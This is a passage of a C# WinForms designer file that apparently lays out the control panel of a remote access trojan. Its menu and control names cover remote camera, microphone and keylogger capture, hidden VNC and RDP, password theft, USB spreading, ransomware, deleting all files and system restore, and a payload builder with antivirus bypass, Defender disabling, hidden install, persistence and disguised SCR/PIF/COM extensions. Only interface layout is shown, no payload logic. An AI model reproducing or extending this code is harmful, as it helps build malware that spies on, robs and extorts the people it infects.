        this.Page2 = new System.Windows.Forms.TabPage();
        this.PanelMonitor = new System.Windows.Forms.Panel();
        this.bunifuShadowPanel3 = new Bunifu.UI.WinForms.BunifuShadowPanel();
        this.bunifuSeparator6 = new Bunifu.UI.WinForms.BunifuSeparator();
        this.bunifuLabel8 = new Bunifu.UI.WinForms.BunifuLabel();
        this.ClaerListMonitor = new System.Windows.Forms.LinkLabel();
        this.InfoMonitorCounts = new Bunifu.UI.WinForms.BunifuLabel();
        this.LogsMonitor = new Guna.UI2.WinForms.Guna2DataGridView();
        this.dataGridViewImageColumn2 = new System.Windows.Forms.DataGridViewImageColumn();
        this.dataGridViewTextBoxColumn2 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.Column3 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.Column2 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.dataGridViewTextBoxColumn4 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.Page3 = new System.Windows.Forms.TabPage();
        this.PanelClients = new System.Windows.Forms.Panel();
        this.PanelListClient = new Bunifu.UI.WinForms.BunifuShadowPanel();
        this.bunifuSeparator2 = new Bunifu.UI.WinForms.BunifuSeparator();
        this.InfoListClients = new Bunifu.UI.WinForms.BunifuLabel();
        this.SearchListClient = new Bunifu.UI.WinForms.BunifuTextBox();
        this.ClientsList = new Guna.UI2.WinForms.Guna2DataGridView();
        this.CLogo = new System.Windows.Forms.DataGridViewImageColumn();
        this.CNickname = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.CID = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.CIP = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.CPort = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.CFlag = new System.Windows.Forms.DataGridViewImageColumn();
        this.CCountry = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.CUsername = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.CAdmin = new System.Windows.Forms.DataGridViewImageColumn();
        this.CSystem = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.CDate = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.Column1 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.CVersion = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.CPing = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.CActive = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.ContexClients = new System.Windows.Forms.ContextMenuStrip(this.components);
        this.ManagerContex = new System.Windows.Forms.ToolStripMenuItem();
        this.toolStripSeparator1 = new System.Windows.Forms.ToolStripSeparator();
        this.RemoteDesktopContex = new System.Windows.Forms.ToolStripMenuItem();
        this.RemoteWindowsActiveContex = new System.Windows.Forms.ToolStripMenuItem();
        this.RemoteMicrophoneContex = new System.Windows.Forms.ToolStripMenuItem();
        this.RemoteKeyloaggerContex = new System.Windows.Forms.ToolStripMenuItem();
        this.RemoteCameraContex = new System.Windows.Forms.ToolStripMenuItem();
        this.RemoteChatContex = new System.Windows.Forms.ToolStripMenuItem();
        this.toolStripSeparator2 = new System.Windows.Forms.ToolStripSeparator();
        this.HiddenApplactionsContex = new System.Windows.Forms.ToolStripMenuItem();
        this.HiddenBrowserContex = new System.Windows.Forms.ToolStripMenuItem();
        this.HiddenRDPContex = new System.Windows.Forms.ToolStripMenuItem();
        this.HiddenVNCContex = new System.Windows.Forms.ToolStripMenuItem();
        this.toolStripSeparator3 = new System.Windows.Forms.ToolStripSeparator();
        this.ReverseProxyContex = new System.Windows.Forms.ToolStripMenuItem();
        this.InternetSpeedContex = new System.Windows.Forms.ToolStripMenuItem();
        this.toolStripSeparator4 = new System.Windows.Forms.ToolStripSeparator();
        this.PasswordsContex = new System.Windows.Forms.ToolStripMenuItem();
        this.MonitorsContex = new System.Windows.Forms.ToolStripMenuItem();
        this.MonitorStartContex = new System.Windows.Forms.ToolStripMenuItem();
        this.MonitorStopContex = new System.Windows.Forms.ToolStripMenuItem();
        this.systemToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.SystemHangContex = new System.Windows.Forms.ToolStripMenuItem();
        this.SystemLogoffContex = new System.Windows.Forms.ToolStripMenuItem();
        this.SystemRestartContex = new System.Windows.Forms.ToolStripMenuItem();
        this.SystemShutdownContex = new System.Windows.Forms.ToolStripMenuItem();
        this.OptionsContex = new System.Windows.Forms.ToolStripMenuItem();
        this.extraToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
        this.USBSpreadContex = new System.Windows.Forms.ToolStripMenuItem();
        this.RansomwareContex = new System.Windows.Forms.ToolStripMenuItem();
        this.DeleteAllFilesContex = new System.Windows.Forms.ToolStripMenuItem();
        this.DeleteCookiesContex = new System.Windows.Forms.ToolStripMenuItem();
        this.DeleteSystemRestoreContex = new System.Windows.Forms.ToolStripMenuItem();
        this.VisitWebsiteContex = new System.Windows.Forms.ToolStripMenuItem();
        this.toolStripSeparator5 = new System.Windows.Forms.ToolStripSeparator();
        this.clientToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
        this.ChagneLogoClientContex = new System.Windows.Forms.ToolStripMenuItem();
        this.RenameClientContex = new System.Windows.Forms.ToolStripMenuItem();
        this.UpdateClientContex = new System.Windows.Forms.ToolStripMenuItem();
        this.RestartClientContex = new System.Windows.Forms.ToolStripMenuItem();
        this.CloseClientContex = new System.Windows.Forms.ToolStripMenuItem();
        this.UnistallClientContex = new System.Windows.Forms.ToolStripMenuItem();
        this.sendFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.SendFileToDiskContex = new System.Windows.Forms.ToolStripMenuItem();
        this.toolStripMenuItem_0 = new System.Windows.Forms.ToolStripMenuItem();
        this.SendFileFromURLContex = new System.Windows.Forms.ToolStripMenuItem();
        this.SendFileToMemoryContex = new System.Windows.Forms.ToolStripMenuItem();
        this.folderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.OpenFolderDownloads = new System.Windows.Forms.ToolStripMenuItem();
        this.OpenFolderPasswords = new System.Windows.Forms.ToolStripMenuItem();
        this.OpenFolderKeyloagger = new System.Windows.Forms.ToolStripMenuItem();
        this.Page4 = new System.Windows.Forms.TabPage();
        this.PanelLogs = new System.Windows.Forms.Panel();
        this.bunifuShadowPanel5 = new Bunifu.UI.WinForms.BunifuShadowPanel();
        this.ClearListLogs = new System.Windows.Forms.LinkLabel();
        this.bunifuSeparator4 = new Bunifu.UI.WinForms.BunifuSeparator();
        this.bunifuLabel54 = new Bunifu.UI.WinForms.BunifuLabel();
        this.LogsList = new Guna.UI2.WinForms.Guna2DataGridView();
        this.Column15 = new System.Windows.Forms.DataGridViewImageColumn();
        this.Column16 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.Column17 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.Page5 = new System.Windows.Forms.TabPage();
        this.PanelBuilder = new System.Windows.Forms.Panel();
        this.bunifuShadowPanel1 = new Bunifu.UI.WinForms.BunifuShadowPanel();
        this.EnabledRecoveryData = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.LabelRecoveryData = new System.Windows.Forms.Label();
        this.EnabledDiscord = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.label2 = new System.Windows.Forms.Label();
        this.bunifuTextBox_0 = new Bunifu.UI.WinForms.BunifuTextBox();
        this.pictureBox4 = new System.Windows.Forms.PictureBox();
        this.bunifuLabel1 = new Bunifu.UI.WinForms.BunifuLabel();
        this.ImageBypassAV = new System.Windows.Forms.PictureBox();
        this.InfoBypassAV = new Bunifu.UI.WinForms.BunifuLabel();
        this.keyloggerOfflien = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.TxkeyloggerOfflien = new System.Windows.Forms.Label();
        this.PanelDelay = new System.Windows.Forms.Panel();
        this.BuilderExcutionDelay = new Bunifu.UI.WinForms.BunifuTextBox();
        this.PanelReDelay = new System.Windows.Forms.Panel();
        this.BuilderReconnectDelay = new Bunifu.UI.WinForms.BunifuTextBox();
        this.PanelTask = new System.Windows.Forms.Panel();
        this.ComDownTasks = new Bunifu.UI.WinForms.BunifuDropdown();
        this.BaypassAV = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.label28 = new System.Windows.Forms.Label();
        this.Build = new Guna.UI2.WinForms.Guna2GradientButton();
        this.pictureBox1 = new System.Windows.Forms.PictureBox();
        this.BuilderDelay = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.TxExDelay = new System.Windows.Forms.Label();
        this.InsPanel = new System.Windows.Forms.Panel();
        this.TxTemplates = new System.Windows.Forms.Label();
        this.BuilderTemplates = new Bunifu.UI.WinForms.BunifuRadioButton();
        this.TxApplacation = new System.Windows.Forms.Label();
        this.BuilderApplicationData = new Bunifu.UI.WinForms.BunifuRadioButton();
        this.TxUserProfil = new System.Windows.Forms.Label();
        this.BuilderBloackAccessPath = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.TxBlockPath = new System.Windows.Forms.Label();
        this.BuilderUserProfile = new Bunifu.UI.WinForms.BunifuRadioButton();
        this.BuilderProcessName = new Bunifu.UI.WinForms.BunifuTextBox();
        this.Foldername = new Bunifu.UI.WinForms.BunifuTextBox();
        this.BuilderHiddenInstall = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.TxHiddenInstall = new System.Windows.Forms.Label();
        this.TxHiddenProcess = new System.Windows.Forms.Label();
        this.AutoStartup = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.TxStartup = new System.Windows.Forms.Label();
        this.HiddenProcess = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.DeleteSystemRestore = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.TxRestore = new System.Windows.Forms.Label();
        this.TxHtml = new System.Windows.Forms.Label();
        this.TxDefault = new System.Windows.Forms.Label();
        this.HostDefault = new Bunifu.UI.WinForms.BunifuRadioButton();
        this.HostHtml = new Bunifu.UI.WinForms.BunifuRadioButton();
        this.BuilderInstallation = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.TxInstall = new System.Windows.Forms.Label();
        this.BuilderCreateTask = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.TxTask = new System.Windows.Forms.Label();
        this.BuilderDefender = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.TxWD = new System.Windows.Forms.Label();
        this.bunifuCheckBox_0 = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.TxUAC = new System.Windows.Forms.Label();
        this.BuilderProcessMutex = new Bunifu.UI.WinForms.BunifuTextBox();
        this.BuilderPort = new Bunifu.UI.WinForms.BunifuTextBox();
        this.BuilderHost = new Bunifu.UI.WinForms.BunifuTextBox();
        this.BuilderGroup = new Bunifu.UI.WinForms.BunifuTextBox();
        this.BuilderKey = new Bunifu.UI.WinForms.BunifuTextBox();
        this.BuilderDelayConnect = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.TxDelay = new System.Windows.Forms.Label();
        this.bunifuSeparator1 = new Bunifu.UI.WinForms.BunifuSeparator();
        this.Page6 = new System.Windows.Forms.TabPage();
        this.PanelSettings = new System.Windows.Forms.Panel();
        this.bunifuShadowPanel4 = new Bunifu.UI.WinForms.BunifuShadowPanel();
        this.TestNotif = new Guna.UI2.WinForms.Guna2GradientButton();
        this.SaveSetting = new Guna.UI2.WinForms.Guna2GradientButton();
        this.pictureBox7 = new System.Windows.Forms.PictureBox();
        this.label15 = new System.Windows.Forms.Label();
        this.bunifuLabel7 = new Bunifu.UI.WinForms.BunifuLabel();
        this.EffectNotif = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.pictureBox6 = new System.Windows.Forms.PictureBox();
        this.label14 = new System.Windows.Forms.Label();
        this.bunifuSeparator5 = new Bunifu.UI.WinForms.BunifuSeparator();
        this.ScrollToOutNotif = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.bunifuLabel5 = new Bunifu.UI.WinForms.BunifuLabel();
        this.label13 = new System.Windows.Forms.Label();
        this.TxPings = new System.Windows.Forms.Label();
        this.ShowCloseButtNotif = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.TxMonitors = new System.Windows.Forms.Label();
        this.label12 = new System.Windows.Forms.Label();
        this.EnablePings = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.ShowIconNotif = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.SpeedNotif = new Bunifu.UI.WinForms.BunifuTextBox();
        this.TxWindowsActive = new System.Windows.Forms.Label();
        this.TextDelayNotif = new Bunifu.UI.WinForms.BunifuTextBox();
        this.EnableMonitors = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.TextMessageNotif = new Bunifu.UI.WinForms.BunifuTextBox();
        this.EnableWindowsActive = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.TextTitleNotif = new Bunifu.UI.WinForms.BunifuTextBox();
        this.pictureBox5 = new System.Windows.Forms.PictureBox();
        this.label10 = new System.Windows.Forms.Label();
        this.label9 = new System.Windows.Forms.Label();
        this.TxCountry = new System.Windows.Forms.Label();
        this.EnableCountry = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.label7 = new System.Windows.Forms.Label();
        this.CountScroolForm = new Bunifu.UI.WinForms.BunifuLabel();
        this.EnableFlag = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.TxFlag = new System.Windows.Forms.Label();
        this.CurvatureFormTrackBar = new Guna.UI2.WinForms.Guna2TrackBar();
        this.EdgecurvatureForm = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.label1 = new System.Windows.Forms.Label();
        this.EnableIP = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.TxIP = new System.Windows.Forms.Label();
        this.CurvatureProperties = new Bunifu.UI.WinForms.BunifuDropdown();
        this.EnableID = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.TxID = new System.Windows.Forms.Label();
        this.TransitionSpeed = new Bunifu.UI.WinForms.BunifuDropdown();
        this.TransitionOut = new Bunifu.UI.WinForms.BunifuDropdown();
        this.EnableLogo = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.TxLogo = new System.Windows.Forms.Label();
        this.TransitionLogin = new Bunifu.UI.WinForms.BunifuDropdown();
        this.bunifuLabel6 = new Bunifu.UI.WinForms.BunifuLabel();
        this.Page7 = new System.Windows.Forms.TabPage();
        this.PanelAbout = new System.Windows.Forms.Panel();
        this.pictureBox3 = new System.Windows.Forms.PictureBox();
        this.PageSocketPort = new System.Windows.Forms.TabPage();
        this.PanelButtonPort = new System.Windows.Forms.Panel();
        this.StartPort = new Guna.UI2.WinForms.Guna2GradientButton();
        this.bunifuShadowPanel2 = new Bunifu.UI.WinForms.BunifuShadowPanel();
        this.bunifuLabel4 = new Bunifu.UI.WinForms.BunifuLabel();
        this.TextSocketPort = new Bunifu.UI.WinForms.BunifuTextBox();
        this.CountPort = new Bunifu.UI.WinForms.BunifuLabel();
        this.ListSocketPort = new Guna.UI2.WinForms.Guna2DataGridView();
        this.dataGridViewTextBoxColumn3 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.bunifuLabel17 = new Bunifu.UI.WinForms.BunifuLabel();
        this.ButtonMune = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
        this.PaneControll = new System.Windows.Forms.Panel();
        this.ButSettings = new Guna.UI2.WinForms.Guna2Button();
        this.ButAbout = new Guna.UI2.WinForms.Guna2Button();
        this.ButNotif = new Guna.UI2.WinForms.Guna2Button();
        this.ButBuilder = new Guna.UI2.WinForms.Guna2Button();
        this.ButClients = new Guna.UI2.WinForms.Guna2Button();
        this.ButMonitor = new Guna.UI2.WinForms.Guna2Button();
        this.ButDashboard = new Guna.UI2.WinForms.Guna2Button();
        this.TitlePage = new Bunifu.UI.WinForms.BunifuLabel();
        this.FormResizeBox1 = new Guna.UI2.WinForms.Guna2ResizeBox();
        this.ButtClose = new Guna.UI2.WinForms.Guna2CircleButton();
        this.ButtonMaximized = new Guna.UI2.WinForms.Guna2CircleButton();
        this.PanelBottom = new Bunifu.UI.WinForms.BunifuPanel();
        this.ButtionMinimized = new Guna.UI2.WinForms.Guna2CircleButton();
        this.PanelLeft = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelTOP = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelRight = new Bunifu.UI.WinForms.BunifuPanel();
        this.pictureBox2 = new System.Windows.Forms.PictureBox();
        this.FormDragMine = new Bunifu.UI.WinForms.BunifuFormDrag();
        this.PanelFormElipse = new Bunifu.Framework.UI.BunifuElipse(this.components);
        this.TransitionShowng = new Utilities.BunifuPages.BunifuTransition(this.components);
        this.TransitionHiddeng = new Utilities.BunifuPages.BunifuTransition(this.components);
        this.IconLogs = new System.Windows.Forms.ImageList(this.components);
        this.Flag = new System.Windows.Forms.ImageList(this.components);
        this.TimerDashboard = new System.Windows.Forms.Timer(this.components);
        this.bunifuTransition1 = new Utilities.BunifuPages.BunifuTransition(this.components);
        this.performanceCounter1 = new System.Diagnostics.PerformanceCounter();
        this.performanceCounter2 = new System.Diagnostics.PerformanceCounter();
        this.panelForm.SuspendLayout();
        this.MunePanelProfile.SuspendLayout();
        this.TabMune.SuspendLayout();
        this.tabPage1Builder.SuspendLayout();
        this.PanelMuneBuilder.SuspendLayout();
        this.PanelBrowserIcon.SuspendLayout();
        this.PanelAssemplyInfo.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)(this.ImageIcon)).BeginInit();
        this.tabPage2Monitor.SuspendLayout();
        this.PanelMuneMonitor.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)(this.pictureBox11)).BeginInit();
        this.PanelMonitorGrabber.SuspendLayout();
        this.PanelListScan.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)(this.ListScanActiveAddresses)).BeginInit();
        this.tabPage3.SuspendLayout();
        this.PanelProfile.SuspendLayout();
        this.bunifuPanel19.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)(this.ImageMuneGood)).BeginInit();
        ((System.ComponentModel.ISupportInitialize)(this.ImageMuneError)).BeginInit();
        this.ImageProfileMune.SuspendLayout();
        this.PanelResizeForm.SuspendLayout();
        this.PageForm.SuspendLayout();
        this.Page1.SuspendLayout();
        this.PanelDashboard.SuspendLayout();
        this.bunifuGradientPanel2.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)(this.ListDashboard)).BeginInit();
        this.bunifuGradientPanel3.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)(this.pictureBox9)).BeginInit();
        this.bunifuPanel5.SuspendLayout();
        this.bunifuPanel11.SuspendLayout();
        this.bunifuGradientPanel1.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox1)).BeginInit();
        this.bunifuPanel4.SuspendLayout();
        this.bunifuPanel3.SuspendLayout();
        this.bunifuPanel2.SuspendLayout();
        this.bunifuPanel6.SuspendLayout();
        this.bunifuPanel1.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)(this.pictureBox8)).BeginInit();
        this.Page2.SuspendLayout();
        this.PanelMonitor.SuspendLayout();
        this.bunifuShadowPanel3.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)(this.LogsMonitor)).BeginInit();
        this.Page3.SuspendLayout();
        this.PanelClients.SuspendLayout();
        this.PanelListClient.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)(this.ClientsList)).BeginInit();
        this.ContexClients.SuspendLayout();
        this.Page4.SuspendLayout();
        this.PanelLogs.SuspendLayout();
        this.bunifuShadowPanel5.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)(this.LogsList)).BeginInit();
        this.Page5.SuspendLayout();
        this.PanelBuilder.SuspendLayout();
        this.bunifuShadowPanel1.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)(this.pictureBox4)).BeginInit();
        ((System.ComponentModel.ISupportInitialize)(this.ImageBypassAV)).BeginInit();
        this.PanelDelay.SuspendLayout();
        this.PanelReDelay.SuspendLayout();
        this.PanelTask.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
        this.InsPanel.SuspendLayout();
        this.Page6.SuspendLayout();
        this.PanelSettings.SuspendLayout();
        this.bunifuShadowPanel4.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)(this.pictureBox7)).BeginInit();
        ((System.ComponentModel.ISupportInitialize)(this.pictureBox6)).BeginInit();
        ((System.ComponentModel.ISupportInitialize)(this.pictureBox5)).BeginInit();
        this.Page7.SuspendLayout();
        this.PanelAbout.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)(this.pictureBox3)).BeginInit();
        this.PageSocketPort.SuspendLayout();
        this.PanelButtonPort.SuspendLayout();
        this.bunifuShadowPanel2.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)(this.ListSocketPort)).BeginInit();
        this.PaneControll.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).BeginInit();
        ((System.ComponentModel.ISupportInitialize)(this.performanceCounter1)).BeginInit();
        ((System.ComponentModel.ISupportInitialize)(this.performanceCounter2)).BeginInit();
        this.SuspendLayout();
        // 
        // panelForm
        // 
        this.panelForm.BackColor = System.Drawing.Color.White;
        this.panelForm.Controls.Add(this.MunePanelProfile);
        this.panelForm.Controls.Add(this.PanelResizeForm);
        this.panelForm.Controls.Add(this.bunifuLabel17);
        this.panelForm.Controls.Add(this.ButtonMune);
        this.panelForm.Controls.Add(this.PaneControll);
        this.panelForm.Controls.Add(this.TitlePage);
        this.panelForm.Controls.Add(this.FormResizeBox1);
        this.panelForm.Controls.Add(this.ButtClose);
        this.panelForm.Controls.Add(this.ButtonMaximized);
        this.panelForm.Controls.Add(this.PanelBottom);
        this.panelForm.Controls.Add(this.ButtionMinimized);
        this.panelForm.Controls.Add(this.PanelLeft);
        this.panelForm.Controls.Add(this.PanelTOP);
        this.panelForm.Controls.Add(this.PanelRight);
        this.panelForm.Controls.Add(this.pictureBox2);
        this.panelForm.Dock = System.Windows.Forms.DockStyle.Fill;
        this.panelForm.Location = new System.Drawing.Point(0, 0);
        this.panelForm.Name = "panelForm";
        this.panelForm.Size = new System.Drawing.Size(1029, 628);
        this.panelForm.TabIndex = 572;
        this.panelForm.Visible = false;
        // 
        // MunePanelProfile
        // 
        this.MunePanelProfile.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
        | System.Windows.Forms.AnchorStyles.Right)));
        this.MunePanelProfile.Controls.Add(this.TabMune);
        this.MunePanelProfile.Location = new System.Drawing.Point(480, 12);
        this.MunePanelProfile.Name = "MunePanelProfile";
        this.MunePanelProfile.Size = new System.Drawing.Size(348, 628);
        this.MunePanelProfile.TabIndex = 606;
        this.MunePanelProfile.Visible = false;
        // 
        // TabMune
        // 
        this.TabMune.Alignment = System.Windows.Forms.TabAlignment.Bottom;
        this.TabMune.AllowTransitions = false;
        this.TabMune.Controls.Add(this.tabPage1Builder);
        this.TabMune.Controls.Add(this.tabPage2Monitor);
        this.TabMune.Controls.Add(this.tabPage3);
        this.TabMune.Dock = System.Windows.Forms.DockStyle.Fill;
        this.TabMune.Location = new System.Drawing.Point(0, 0);
        this.TabMune.Multiline = true;
        this.TabMune.Name = "TabMune";
        this.TabMune.Page = this.tabPage2Monitor;
        this.TabMune.PageIndex = 1;
        this.TabMune.PageName = "tabPage2Monitor";
        this.TabMune.PageTitle = "tabPage2";
        this.TabMune.SelectedIndex = 0;
        this.TabMune.Size = new System.Drawing.Size(348, 628);
        this.TabMune.TabIndex = 590;
        animation1.AnimateOnlyDifferences = false;
        animation1.BlindCoeff = ((System.Drawing.PointF)(resources.GetObject("animation1.BlindCoeff")));
        animation1.LeafCoeff = 0F;
        animation1.MaxTime = 1F;
        animation1.MinTime = 0F;
        animation1.MosaicCoeff = ((System.Drawing.PointF)(resources.GetObject("animation1.MosaicCoeff")));
        animation1.MosaicShift = ((System.Drawing.PointF)(resources.GetObject("animation1.MosaicShift")));
        animation1.MosaicSize = 0;
        animation1.Padding = new System.Windows.Forms.Padding(0);
        animation1.RotateCoeff = 0F;
        animation1.RotateLimit = 0F;
        animation1.ScaleCoeff = ((System.Drawing.PointF)(resources.GetObject("animation1.ScaleCoeff")));
        animation1.SlideCoeff = ((System.Drawing.PointF)(resources.GetObject("animation1.SlideCoeff")));
        animation1.TimeCoeff = 0F;
        animation1.TransparencyCoeff = 0F;
        this.TabMune.Transition = animation1;
        this.TabMune.TransitionType = Utilities.BunifuPages.BunifuAnimatorNS.AnimationType.Custom;
        // 
        // tabPage1Builder
        // 
        this.tabPage1Builder.Controls.Add(this.PanelMuneBuilder);
        this.tabPage1Builder.Location = new System.Drawing.Point(4, 4);
        this.tabPage1Builder.Name = "tabPage1Builder";
        this.tabPage1Builder.Padding = new System.Windows.Forms.Padding(3);
        this.tabPage1Builder.Size = new System.Drawing.Size(340, 602);
        this.tabPage1Builder.TabIndex = 0;
        this.tabPage1Builder.Text = "tabPageBuilder";
        this.tabPage1Builder.UseVisualStyleBackColor = true;
        // 
        // PanelMuneBuilder
        // 
        this.PanelMuneBuilder.Controls.Add(this.MuneCloseBuilder);
        this.PanelMuneBuilder.Controls.Add(this.TitleMuneBuilder);
        this.PanelMuneBuilder.Controls.Add(this.PanelBrowserIcon);
        this.PanelMuneBuilder.Controls.Add(this.PanelAssemplyInfo);
        this.PanelMuneBuilder.Controls.Add(this.Payloadname);
        this.PanelMuneBuilder.Controls.Add(this.label26);
        this.PanelMuneBuilder.Controls.Add(this.SaveProperties);
        this.PanelMuneBuilder.Controls.Add(this.SaveSettings);
        this.PanelMuneBuilder.Controls.Add(this.BuilderChackIcon);
        this.PanelMuneBuilder.Controls.Add(this.label25);
        this.PanelMuneBuilder.Controls.Add(this.bunifuDatePicker1);
        this.PanelMuneBuilder.Controls.Add(this.BuilderDatemodified);
        this.PanelMuneBuilder.Controls.Add(this.label24);
        this.PanelMuneBuilder.Controls.Add(this.BuilderAssemblyinformation);
        this.PanelMuneBuilder.Controls.Add(this.label23);
        this.PanelMuneBuilder.Controls.Add(this.label22);
        this.PanelMuneBuilder.Controls.Add(this.SCR);
        this.PanelMuneBuilder.Controls.Add(this.label20);
        this.PanelMuneBuilder.Controls.Add(this.label21);
        this.PanelMuneBuilder.Controls.Add(this.CMD);
        this.PanelMuneBuilder.Controls.Add(this.PIF);
        this.PanelMuneBuilder.Controls.Add(this.label18);
        this.PanelMuneBuilder.Controls.Add(this.label19);
        this.PanelMuneBuilder.Controls.Add(this.EXE);
        this.PanelMuneBuilder.Controls.Add(this.COM);
        this.PanelMuneBuilder.Controls.Add(this.NameIcon);
        this.PanelMuneBuilder.Controls.Add(this.ImageIcon);
        this.PanelMuneBuilder.Dock = System.Windows.Forms.DockStyle.Fill;
        this.PanelMuneBuilder.Location = new System.Drawing.Point(3, 3);
        this.PanelMuneBuilder.Name = "PanelMuneBuilder";
        this.PanelMuneBuilder.Size = new System.Drawing.Size(334, 596);
        this.PanelMuneBuilder.TabIndex = 661;
        // 
        // MuneCloseBuilder
        // 
        this.MuneCloseBuilder.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
        this.MuneCloseBuilder.AutoSize = true;
        this.MuneCloseBuilder.Cursor = System.Windows.Forms.Cursors.Hand;
        this.MuneCloseBuilder.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.MuneCloseBuilder.Location = new System.Drawing.Point(306, 8);
        this.MuneCloseBuilder.Name = "MuneCloseBuilder";
        this.MuneCloseBuilder.Size = new System.Drawing.Size(16, 15);
        this.MuneCloseBuilder.TabIndex = 599;
        this.MuneCloseBuilder.Text = "X";
        this.MuneCloseBuilder.Click += new System.EventHandler(this.MuneClose_Click_1);
        // 
        // TitleMuneBuilder
        // 
        this.TitleMuneBuilder.AllowParentOverrides = false;
        this.TitleMuneBuilder.AutoEllipsis = false;
        this.TitleMuneBuilder.AutoSize = false;
        this.TitleMuneBuilder.Cursor = System.Windows.Forms.Cursors.Default;
        this.TitleMuneBuilder.CursorType = System.Windows.Forms.Cursors.Default;
        this.TitleMuneBuilder.Dock = System.Windows.Forms.DockStyle.Top;
        this.TitleMuneBuilder.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
        this.TitleMuneBuilder.ForeColor = System.Drawing.Color.Gray;
        this.TitleMuneBuilder.Location = new System.Drawing.Point(0, 0);
        this.TitleMuneBuilder.Name = "TitleMuneBuilder";
        this.TitleMuneBuilder.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.TitleMuneBuilder.Size = new System.Drawing.Size(334, 17);
        this.TitleMuneBuilder.TabIndex = 569;
        this.TitleMuneBuilder.Text = "...";
        this.TitleMuneBuilder.TextAlignment = System.Drawing.ContentAlignment.MiddleCenter;
        this.TitleMuneBuilder.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        // 
        // PanelBrowserIcon
        // 
        this.PanelBrowserIcon.Controls.Add(this.BrowserIcon);
        this.PanelBrowserIcon.Location = new System.Drawing.Point(196, 399);
        this.PanelBrowserIcon.Name = "PanelBrowserIcon";
        this.PanelBrowserIcon.Size = new System.Drawing.Size(125, 39);
        this.PanelBrowserIcon.TabIndex = 667;
        // 
        // BrowserIcon
        // 
        this.BrowserIcon.Animated = true;
        this.BrowserIcon.BorderRadius = 2;
        this.BrowserIcon.CheckedState.Parent = this.BrowserIcon;
        this.BrowserIcon.CustomImages.Parent = this.BrowserIcon;
        this.BrowserIcon.FillColor = System.Drawing.Color.Navy;
